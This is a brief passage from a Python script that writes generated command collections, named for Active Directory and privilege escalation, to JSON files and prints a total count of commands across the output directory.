    save_commands("active_directory_generated.json", AD_NEW)
    save_commands("privilege_escalation_generated.json", PRIVESC_NEW)
    
    # Count total
    total = 0
    for f in OUTPUT_DIR.glob("*.json"):
        with open(f) as fp:
            total += len(json.load(fp))
    print(f"\nTotal commands across all files: {total}")
